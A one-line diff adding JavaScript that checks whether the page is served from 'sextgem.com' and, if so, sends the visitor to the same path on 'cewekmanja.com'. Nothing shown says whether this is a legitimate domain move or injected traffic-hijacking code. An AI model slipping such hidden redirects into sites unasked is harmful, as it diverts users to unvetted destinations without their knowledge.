@@ -1,0 +1,1 @@
+var _ax1 = window.location.hostname;if (_ax1.match(/sextgem.com/i)) {location.href="http://cewekmanja.com"+location.pathname+location.search+location.hash} 
